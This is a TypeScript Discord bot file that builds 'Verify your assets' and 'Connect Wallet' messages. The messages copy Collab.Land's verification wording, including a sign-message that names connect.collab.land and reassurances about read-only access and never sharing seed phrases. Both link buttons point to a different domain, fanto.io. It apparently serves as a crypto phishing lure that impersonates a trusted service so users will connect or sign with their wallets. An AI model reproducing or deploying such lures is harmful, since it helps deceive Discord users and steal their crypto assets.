import {ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Interaction} from "discord.js";

export const joinMessage = () => {
    const embed = new EmbedBuilder()
        .setColor("Random")
        .setTitle(`Verify your assets`)
        .setDescription('This is a read-only connection. Do not share your private keys. We will never ask for your seed phrase. We will never DM you.')
        .setThumbnail(`https://s3.coinmarketcap.com/static/img/portraits/621c22097aafe46422aa1161.png`)
        .setImage('https://s2.coinmarketcap.com/static/img/coins/64x64/3890.png')
    // .addFields(
    //     {name: "이름", value: `${interaction.guild?.name}`, inline: true},
    // )
    // .setTimestamp()
    // .setFooter({
    //     text: `Requested by ${guild.name}`,
    //     iconURL: `${guild.iconURL()}`
    // });

    const row = new ActionRowBuilder<ButtonBuilder>()
        .addComponents(
            new ButtonBuilder()
                .setCustomId("letsgo")
                .setLabel('Let\'s go')
                .setStyle(ButtonStyle.Primary),
        ).addComponents(
            new ButtonBuilder()
                .setLabel('Docs')
                .setURL("https://fanto.io")
                .setStyle(ButtonStyle.Link),
        );


    return {
        embeds: [embed],
        components: [row]
    }
}

export const letsGoButtonClickMessage = (interaction: Interaction) => {
    const embed = new EmbedBuilder()
        .setColor("Random")
        .setTitle(`Please read instructions carefully before connecting`)
        .setDescription('You should expect to sign the following message when prompted by a non-custodial wallet such as MetaMask:' +
            '\`\`\`' +
            'Collab.Land (connect.collab.land) asks you to sign this message for the purpose of verifying your account ownership. This is READ-ONLY access and will NOT trigger any blockchain transactions or incur any fees.\n' +
            '\n' +
            `- Community: ${interaction.guild?.name}\n` +
            `- User: ${interaction.user.tag}\n` +
            `- Discord Interaction: ${interaction.id}\n` +
            `- Timestamp: ${interaction.createdAt}` +
            '\`\`\`')
        .setFooter({
            text: 'Make sure you sign the EXACT message (some wallets may use \\n for new lines) and NEVER share your seed phrase or private key.'

        })
        .setFooter({
            text: `Make sure you sign the EXACT message (some wallets may use \n for new lines) and NEVER share your seed phrase or private key.`,
            iconURL: `https://s2.coinmarketcap.com/static/img/coins/64x64/3890.png`
        });

    const row = new ActionRowBuilder<ButtonBuilder>()
        .addComponents(
            new ButtonBuilder()
                .setLabel('Connect Wallet')
                .setURL("https://fanto.io")
                .setStyle(ButtonStyle.Link),
        );


    return {
        ephemeral: true,
        embeds: [embed],
        components: [row]
    }
}